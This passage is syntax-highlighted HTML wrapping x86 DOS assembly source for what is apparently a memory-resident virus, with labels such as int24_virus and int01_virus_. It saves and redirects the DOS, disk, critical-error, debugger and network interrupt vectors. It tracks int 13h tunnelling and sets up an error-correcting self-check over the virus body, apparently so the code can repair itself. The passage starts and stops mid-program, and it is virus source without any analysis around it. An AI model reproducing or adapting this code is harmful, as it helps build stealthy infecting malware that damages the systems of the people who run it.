</span><span class="sc5">get_int_add</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">     </span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">; Get interrupt address</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:DX = interrupt address</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_int_addr</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set interrupt address</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; BX = offset of interrupt address</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; "  "   "    "      "        "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; Store interrupt offset</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">; Store interrupt segment</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">load_int01</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get and set address of interrupt...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_int01_</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">load_int01_</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get and set address of interrupt...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 01h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">int01_addr_</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">int01_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">restore_int</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Restore address of interrupt 13h...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr__</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr__</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int21_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 13h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr_</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tun_i13_stat</span><span class="sc4">],</span><span class="sc2">00000001b</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dont_set_i13</span><span class="sc0">    </span><span class="sc1">; Interrupt 13h is in use? Jump to...</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">
</span><span class="sc5">dont_set_i13</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int24_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int24_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int24_virus</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int01_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int01_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int01_virus_</span><span class="sc0">     </span><span class="sc1">; DX = offset of int01_virus_</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 03h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int03_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int03_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int03_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int03_virus</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 2ah</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int2a_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int2a_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int2a_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int2a_virus</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_int_addr</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; Load registers from stacl</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_int_add_</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Get interrupt addresses</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save segments at stack</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int21_addr__</span><span class="sc0">     </span><span class="sc1">; SI = offset of int21_addr__</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int13_addr_</span><span class="sc0">  </span><span class="sc1">; SI = offset of int13_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 13h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int24_addr</span><span class="sc0">   </span><span class="sc1">; SI = offset of int24_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int2a_addr</span><span class="sc0">   </span><span class="sc1">; SI = offset of int2a_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 2ah</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc1">; SI = offset of int01_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">int03_addr</span><span class="sc0">   </span><span class="sc1">; SI = offset of int03_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; BX = interrupt vector 03h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load segments from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ecc_prepare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">           </span><span class="sc1">; selected nr of info bits</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; for ecc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">170h</span><span class="sc0">        </span><span class="sc1">; lenght (in segments) of</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; stuff to check</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ecc_temp_buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; to segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; virus segment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; temporary memory for calc</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ecc_check_data</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; convert to segment</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; add base CS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; ecc data to check with</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int08_virus</span><span class="sc0">   </span><span class="sc1">; pointer to code where ecc</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; is calculated from</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_entrypoint</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ecc_entrypoint</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">arg_0</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">arg_2</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">arg_4</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">arg_6</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">0Ah</span><span class="sc0">
</span><span class="sc5">arg_8</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc2">0Ch</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_6</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; lenght in paras</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; temp space</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_0</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; where from</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_create_table</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; info bits</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; check data segment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ecc data segment generated before</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ecc_compute_diffs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; ecc data segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">arg_8</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
